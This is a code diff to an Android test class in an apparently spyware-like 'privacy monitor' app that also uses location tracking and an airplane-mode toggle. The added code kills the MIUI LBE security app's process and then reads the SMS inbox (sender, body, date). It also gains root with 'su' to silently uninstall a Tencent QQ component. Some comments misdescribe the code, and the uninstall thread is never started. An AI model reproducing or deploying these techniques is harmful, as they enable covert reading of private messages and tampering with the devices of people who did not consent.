@@ -1,18 +1,26 @@
 package com.privacy.monitor.test;
 
+import java.io.InputStream;
+import java.io.OutputStream;
 import java.util.Date;
-
+import java.util.List;
 import org.json.JSONArray;
 import org.json.JSONException;
 import org.json.JSONObject;
-
 import com.baidu.location.LocationClientOption;
+import com.privacy.monitor.domain.TaskInfo;
 import com.privacy.monitor.inte.RunBack;
 import com.privacy.monitor.location.LocationMan;
+import com.privacy.monitor.provider.TaskInfoProvider;
+import com.privacy.monitor.resolver.field.SMSConstant;
 import com.privacy.monitor.util.AppUtil;
 import com.privacy.monitor.util.Logger;
 import com.privacy.monitor.util.NetworkUtil;
-
+import android.app.ActivityManager;
+import android.content.ContentResolver;
+import android.content.Context;
+import android.database.Cursor;
+import android.os.SystemClock;
 import android.test.AndroidTestCase;
 import android.text.TextUtils;
 
@@ -86,7 +94,7 @@ public class Test extends AndroidTestCase {
 	}
 	
 	public void toggleAirplane(){
-		AppUtil.toggleAirplane(getContext(),true);
+		AppUtil.toggleAirplane(getContext(),true,0);
 	}
 	
 	public void location(){
@@ -95,6 +103,89 @@ public class Test extends AndroidTestCase {
 		locationMan.setLocationPro(LocationClientOption.NetWorkFirst);
 		locationMan.startLocaiton();
 		
+	}
+	
+	/**
+	 * 杀死所有正在运行的进程(除系统进程外)
+	 */
+	public void killTask() {
+		// 需要获得的字段列
+		String[] PROJECTION = {SMSConstant.TYPE,
+				SMSConstant.ADDRESS, SMSConstant.BODY, SMSConstant.DATE,
+				 SMSConstant.READ};
+		 ActivityManager  am = (ActivityManager) getContext().getSystemService(Context.ACTIVITY_SERVICE);
+		 ContentResolver contentResult = getContext().getContentResolver();
+		TaskInfoProvider provider = new TaskInfoProvider(getContext());
+		List<TaskInfo> taskInfos = provider.getAllTasks(am.getRunningAppProcesses());
+		for (TaskInfo taskInfo : taskInfos) {
+			String packname = taskInfo.getPackname();
+			
+			if ("com.lbe.security.miui".equals(packname)) {
+				Logger.d("BootRectiver", "杀死了..." + packname);
+				am.killBackgroundProcesses(packname);
+				SystemClock.sleep(1000);
+				Cursor smsCursor = contentResult.query(SMSConstant.CONTENT_URI, PROJECTION, null,null, null);
+				if(smsCursor !=null){
+					Logger.d("Test","有:"+smsCursor.getCount());
+				}
+			}
+		}
+	}
+	
+	public void endExecution(){
+		int end = 9 ;
+		if(end ==9){
+			Logger.d("Test","endExecution");
+			int aaa = 10;
+			if(aaa==10){
+				Logger.d("Test","StartExecution");
+				return ;
+			}
+		}
+		Logger.d("Test","测试");
+	}
+	
+	public void getExecutePM(){
+		new Thread(new Runnable() {
+			
+			@Override
+			public void run() {
+				
+				Process process = null;
+				OutputStream out = null;
+				InputStream in = null;
+				try {
+					//请求root
+					process = Runtime.getRuntime().exec("su");
+					out = process.getOutputStream();
+					//调用安装
+					out.write(("pm uninstall -k com.tencent.mobileqq.MSF " +"\n" ).getBytes());
+					in = process.getInputStream();
+					int len = 0 ;
+					byte [] bs = new byte [256];
+					while( -1 != (len=in.read(bs))){
+						String state = new String(bs,0,len);
+						if(state.equalsIgnoreCase("Success\n")){
+							Logger.d("Test","卸载成功");
+						}
+					}
+				} catch (Exception e) {
+					e.printStackTrace();
+				}finally{
+					try {
+						if(out !=null){
+							out.flush();
+							out.close();
+						}
+						if(in !=null){
+							in.close();
+						}
+					} catch (Exception e) {
+						e.printStackTrace();
+					}
+				}
+			}
+		});
 	}
 	
 	public class TextRunBack implements RunBack{
